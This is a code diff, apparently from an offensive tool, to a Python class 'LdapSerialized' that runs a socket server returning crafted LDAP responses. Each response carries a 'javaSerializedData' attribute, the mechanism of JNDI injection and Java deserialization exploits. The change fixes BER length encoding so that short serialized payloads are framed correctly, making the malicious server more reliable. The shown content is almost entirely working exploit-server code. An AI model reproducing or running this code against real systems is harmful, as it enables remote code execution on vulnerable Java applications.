@@ -38,7 +38,7 @@ class LdapSerialized():
         self.ip = ip
         self.port = port
 
-    def serve(self):
+    def __serve(self):
         s = socket.socket()
         s.bind((self.ip, self.port))
         s.listen(5)
@@ -66,12 +66,24 @@ class LdapSerialized():
             msg1 = addAttribute(b"javaSerializedData", serobj)
             msg2 = addAttribute(b"javaClassName", b"java.lang.String")
             msg = msg2 + msg1
-            len3 = len(msg).to_bytes(2, byteorder="big")
-            msg = b"\x04" + len2.to_bytes(1, byteorder="big") + classname + b"\x30\x82" + len3 + msg
-            len4 = len(msg).to_bytes(2, byteorder="big")
-            msg = b"\x02\x01\x02\x64\x82" + len4 + msg
-            len5 = len(msg).to_bytes(2, byteorder="big")
-            msg = b"\x30\x82" + len5 + msg
+            if len(msg) >= 0xFF:
+                len3 = len(msg).to_bytes(2, byteorder="big")
+                msg = b"\x04" + len2.to_bytes(1, byteorder="big") + classname + b"\x30\x82" + len3 + msg
+            else:
+                len3 = len(msg).to_bytes(1, byteorder="big")
+                msg = b"\x04" + len2.to_bytes(1, byteorder="big") + classname + b"\x30" + len3 + msg
+            if len(msg) >= 0xFF:
+                len4 = len(msg).to_bytes(2, byteorder="big")
+                msg = b"\x02\x01\x02\x64\x82" + len4 + msg
+            else:
+                len4 = len(msg).to_bytes(1, byteorder="big")
+                msg = b"\x02\x01\x02\x64" + len4 + msg
+            if len(msg) >= 0xFF:
+                len5 = len(msg).to_bytes(2, byteorder="big")
+                msg = b"\x30\x82" + len5 + msg
+            else:
+                len5 = len(msg).to_bytes(1, byteorder="big")
+                msg = b"\x30" + len5 + msg
             # 发送
             conn.send(msg)
             # 结束通信，这是必须的
@@ -79,7 +91,7 @@ class LdapSerialized():
             conn.recv(36)
 
     def run(self):
-        self.thread = Thread(target=self.serve)
+        self.thread = Thread(target=self.__serve)
         self.thread.start()
 
 
